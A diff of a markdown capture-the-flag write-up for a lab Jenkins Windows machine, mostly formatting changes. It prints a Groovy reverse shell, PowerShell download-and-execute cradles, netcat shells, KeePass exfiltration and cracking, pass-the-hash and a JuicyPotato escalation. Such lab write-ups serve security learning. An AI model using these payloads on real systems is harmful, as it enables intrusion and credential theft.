@@ -1,7 +1,7 @@
 # Reconnaissance
 ## Nmap Enumeration
 - We pass the commands:
-	```bash
+```
 nmap -sV -sC -vv 10.10.10.63
 nmap -sU --top-ports=10 -vv 10.10.10.63
 ---OUTPUT-TCP---
@@ -40,6 +40,7 @@ Host script results:
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 ```
+- Intersting:
 	- http 80 
 	- smb security mode?
 		- guest user
@@ -48,17 +49,17 @@ Host script results:
 ## Directory Enumeration
 - Gobuster:
 	- Directory
-		```bash
+```
 gobuster dir -u http://10.10.10.63:50000 dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
 
 ---OUTPUT---
 /askjeeves            (Status: 302) [Size: 0] [--> http://10.10.10.63:50000/askjeeves/]
 ```
-		- Tried with dirb/big.txt and got nothing
+- Tried with dirb/big.txt and got nothing
 - Ffuf gave nothing
 - Dirsearch gve nothing
 - Dirbuster
-	![[Pasted image 20250410014800.png]]
+	![Pasted image 20250410014800.png](../Attachments/Pasted%20image%2020250410014800.png)
 
 ## Website Enumeration
 - 10.10.10.63:80 - fake website, source code reveals it just goes to error.html?
@@ -70,28 +71,28 @@ gobuster dir -u http://10.10.10.63:50000 dns --wordlist /usr/share/wordlists/dir
 		- Manage Jenkins > Script Console (manage/script)
 		- https://gist.github.com/rootsecdev/273f22a747753e2b17a2fd19c248c4b7
 			- Execute the script with netcat listening.
-				```bash
+```
 String host="10.10.14.25";
 int port=9999;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-			- We get a shell as jeeves/kohsuke
-				- we can also use this to test:
-					```bash
+- We get a shell as jeeves/kohsuke
+	- we can also use this to test:
+```
 cmd = "whoami"
 println cmd.execute().text
 ```
-				- And then get a shell by using nishangs tcpreverseshell.ps1
-					```bash
+- And then get a shell by using nishangs tcpreverseshell.ps1
+```
 sudo cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
 mv Invoke-PowerShellTcp.ps1 rev.ps1 # make sure to edit to your Ip and listener
 cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/rev.ps1')" """
 println cmd.execute().text
 ```
-					- We get shell
-				- Can also try (doesn't work):
-					```bash
+- We get shell
+- Can also try (doesn't work):
+```
 cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/nc.exe')" """
 cmd2 = """ nc.exe -e 10.10.14.25 9999 """
 println cmd.execute().text
@@ -100,10 +101,10 @@ println cmd2.execute().text
 
 ---OR---
 ```
-	- Alternatively, though not recommended as it's noisy (can be seen), we can create a project and under Build we sellect Windows batch command.
-		- Here we can execute windows cmd commands.
-		- We host a server where we have nc.exe and 
-			```bash
+- Alternatively, though not recommended as it's noisy (can be seen), we can create a project and under Build we sellect Windows batch command.
+	- Here we can execute windows cmd commands.
+	- We host a server where we have nc.exe and 
+```
 powershell wget "http://10.10.14.25:8001/nc.exe" -outfile "nc.exe"
 nc.exe -e cmd.exe 10.10.14.25 9999 
 ```
@@ -112,14 +113,14 @@ nc.exe -e cmd.exe 10.10.14.25 9999
 - 
 ## Privilege Escalation
 - secret.key in .jenkins file
-	```bash
+```
 PS C:\Users\Administrator\.jenkins> type secret.key
 58d05496da2496d09036d36c99b56f1e89cc662f3e65a4023de71de7e1df8afb
 ```
 - We find CEH.kdbx and try to get it onto our machine
 	- If we used reverse tcp powershell then we cannot send via netcat (i tried and the < operator doesn't work when trying to do the cmd command)
 		- Then we need to create an smb share and copy the file:
-			```bash
+```
 mkdir smb
 cd smb
 impacket-smbserver rocknrj 'pwd' #pwd is path
@@ -129,8 +130,8 @@ PS> New-PSDrive -Name "rocknrjay" -PSProvider "Filesystem" -Root "\\10.10.14.25\
 cd rocknrjay:
 cp C:\Users\kohsuke\Documents\CEH.kdbx .
 ```
-	- If we don't use reverse tcp powershell, so either the groovy script we found in github or via the build, then we can execute netcat:
-		```bash
+- If we don't use reverse tcp powershell, so either the groovy script we found in github or via the build, then we can execute netcat:
+```
 ---ON-LOCAL-MACHINE---
 nc -lvnp 9999 > CEH.kdbx
 
@@ -138,24 +139,24 @@ nc -lvnp 9999 > CEH.kdbx
 cd C:\Users\kohsuke\Documents
 C:\Users\Administrator\.jenkins\nc.exe 10.10.14.25 9999 < "C:\Users\kohsuke\Documents\CEH.kdbx"
 ```
-		- Alternatively we can move it to .jenkins/workgroup and download it from jenkins dashboard at workgroups subdirectory.
+- Alternatively we can move it to .jenkins/workgroup and download it from jenkins dashboard at workgroups subdirectory.
 - Now we retrieve the hash from this file on our local machine:
-	```bash
+```
 keepass2john CEH.kdbx
 keepass2john CEH.kdbx > CEH.hash
 
 ---OUTPUT---
 CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
 ```
-	- Then we attempt to crack it:
-		```bash
+- Then we attempt to crack it:
+```
 john CEH.hash --wordlist=/usr/share/wordlists/rockyou.txt
 
 ---OUTPUT---
 moonshine1       (CEH)
 ```
 - We then retrieve the password from the keepass database:
-	```bash
+```
 kpcli --kdb CEH.kdbx
 > moonshine 1
 ls
@@ -180,8 +181,8 @@ Uname: ?
 Notes:
 
 ```
-	- We also find other passwords which we put into a text file and tried to check with SMB (**they all fail**), to also add actually only the ntlm hash and admin password is needed to check as the other users aren't what we need but we check anyway:
-		```bash
+- We also find other passwords which we put into a text file and tried to check with SMB (**they all fail**), to also add actually only the ntlm hash and admin password is needed to check as the other users aren't what we need but we check anyway:
+```
 cat passwords
 crackmapexec smb 10.10.10.63 -u Administrator -p passwords
 
@@ -194,12 +195,12 @@ lCEUnYPjNfIuPZSzOySA
 Password
 ```
 - We attempt to login cia Pass-the-Hash method:
-	```bash
+```
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63
 ```
-	- If using winexe its `jenkins/administrator%<hash>`
+- If using winexe its `jenkins/administrator%<hash>`
 - We gain access but can't find root flag:
-	```bash
+```
 cd C:\Users\Administrator\Desktop
 dir
 
@@ -217,15 +218,15 @@ dir
                2 Dir(s)   2,653,650,944 bytes free
 
 ```
-	- We try to read hm.txt
-		```bash
+- We try to read hm.txt
+```
 type hm.txt
 
 ---OUTPUT---
 The flag is elsewhere.  Look deeper.
 ```
 - We check for any alternate data streams with the /R argument:
-	```bash
+```
 dir /R
 
 ---OUTPUT---
@@ -242,21 +243,21 @@ dir /R
                2 File(s)            833 bytes
                2 Dir(s)   2,653,638,656 bytes free
 ```
-	- To read the stream we pipe it into more (can use notepad or other methods...notepad would require a GUI though)
-		```bash
+- To read the stream we pipe it into more (can use notepad or other methods...notepad would require a GUI though)
+```
 more < hm.txt:root.txt
 
 ---OUTPUT---
 afbc5bd4b615a60648cec41c6ac92530
 ```
-		- We gain root flag
+- We gain root flag
 - If using powershell:
-	```bash
+```
 cmd > powershell (Get-Content hm.txt -Stream root.txt)
 ```
 ## Alternate Privilege Escalation Method (Unintended, harder)
 - Upload PowerUp.ps1
-	```bash
+	```
 IEX(New-Object Net.WebClient).downloadString("http://10.10.14.25:8001/PowerUp.ps1")
 Invoke-AllChecks
 
@@ -291,7 +292,7 @@ Check        : Unattended Install Files
 	- Modified Service File check : theres a service jenkins and we should be able to modify it and when it restarts, it starts our executable that we put in
 	- We check unattended path but theres nothing
 - Another command to check Privilege Names:
-	```bash
+	```
 whoami /priv
 
 ---OUTPUT---
@@ -314,7 +315,7 @@ SeTimeZonePrivilege           Change the time zone                      Disabled
 	- https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
 		- Shows vulnerable tokens we could privesc from
 	- We use unicorn to create a meterpreter shell:
-		```bash
+		```
 cd /opt/unicorn
 sudo python unicorn.py
 cp password_attack.txt /...../Jeeves/www/msf.txt
@@ -325,9 +326,9 @@ msfconsole -r unicorn.rc
 ---ON-TARGET---
 IEX(New-Object Net.WebClient).downloadString("http://10.10.14.25:8001/msf.txt")
 ```
-		- We should get meterpreter shell.
+- We should get meterpreter shell.
 - load incognito let's us play with tokens
-	```bash
+```
 session -i 1
 load stdapi
 load incognito
@@ -348,8 +349,8 @@ Incognito Commands
     snarf_hashes              Snarf challenge/response hashes for every token
 
 ```
-	- We need list_tokens:
-		```bash
+- We need list_tokens:
+```
 list_tokens -u
 list_tokens -g
 
@@ -383,16 +384,16 @@ Impersonation Tokens Available
 ========================================
 No tokens available
 ```
-	- We execute rottenpotato.exe on Juicypotato.exe (make sure in right directory where it was sent)
-		```bash
+- We execute rottenpotato.exe on Juicypotato.exe (make sure in right directory where it was sent)
+```
 execute -cH -f rottenpotato.exe
 ---OR---
 execute -cH -f JuicyPotato.exe
 ```
-		- **DOESN'T WORK**... but we are supposed to get some Impersonation tokens
-			- `BUILTIN\\Administrators`
-				- We impersonate this token:
-					```bash
+- **DOESN'T WORK**... but we are supposed to get some Impersonation tokens
+	- `BUILTIN\\Administrators`
+		- We impersonate this token:
+```
 impersonate_token "BUILTIN\\Administrators"
 shell
 > whoami
@@ -403,7 +404,7 @@ Nt authority\system
 -----------
 **FIXED METHOD USING ONLY MSFCONSOLE**
 - Since it doesn't work we try to exploit the whole thing via msfconsole.
-	```bash
+```
 msfconsole
 use exploit/multi/script/web_delivery
 set srvhost 10.10.14.25
@@ -430,12 +431,12 @@ powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0
 [*] Meterpreter session 1 opened (10.10.14.25:4444 -> 10.10.10.63:49811) at 2025-04-11 03:51:30 -0400
 
 ```
-	- We copy the output command to the target shell (remove powershell.exe from command if shell is already powershell)
-		```bash
+- We copy the output command to the target shell (remove powershell.exe from command if shell is already powershell)
+```
 powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAByAGkAegBwAFMAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcgBpAHoAcABTAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcgBpAHoAcABTAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA1ADoAOAAwADgAMAAvADUAOQBRAEoAUwB6AHAANABtAE4AeABDAHUALwBaAFQAeABHAFkAcAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA1ADoAOAAwADgAMAAvADUAOQBRAEoAUwB6AHAANABtAE4AeABDAHUAJwApACkAOwA=
 ```
-		- We get a meterpreter shell.
-			```bash
+- We get a meterpreter shell.
+```
 sessions -i 1
 getuid
 getprivs
@@ -457,8 +458,8 @@ SeShutdownPrivilege
 SeTimeZonePrivilege
 SeUndockPrivilege
 ```
-	- We search for possible exploits:
-		```bash
+- We search for possible exploits:
+```
 run post/multi/recon/local_exploit_suggester
 
 ---OUTPUT-MAIN---
@@ -466,15 +467,15 @@ run post/multi/recon/local_exploit_suggester
  10  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 ```
 		- These are RottenPotato and JuicyPotato exploits. Since JuicyPotato has more success rate we use that here but both should work.
-	- We background the current session
-		```bash
+- We background the current session
+```
 background
 
 ---OUTPUT---
 [*] Backgrounding session 1...
 ```
-	- We then use our exploit (path of reflecticy juicy)
-		```bash
+- We then use our exploit (path of reflecticy juicy)
+```
 use exploit/windows/local/ms16_075_reflection_juicy
 show options
 set session 1
@@ -496,8 +497,8 @@ run
 [*] Meterpreter session 2 opened (10.10.14.25:4444 -> 10.10.10.63:49818) at 2025-04-11 03:55:30 -0400
 
 ```
-	- We see session 2 has started so we get into session 2 and check our user
-		```bash
+- We see session 2 has started so we get into session 2 and check our user
+```
 sessions -i 2
 getuid
 shell
@@ -509,4 +510,4 @@ Server username: NT AUTHORITY\SYSTEM
 ---OUTPUT-SHELL---
 nt authority\system
 ```
-		- We can proceed to the root flag location and read the alternate data stream of hm.txt as discussed earlier.
+- We can proceed to the root flag location and read the alternate data stream of hm.txt as discussed earlier.
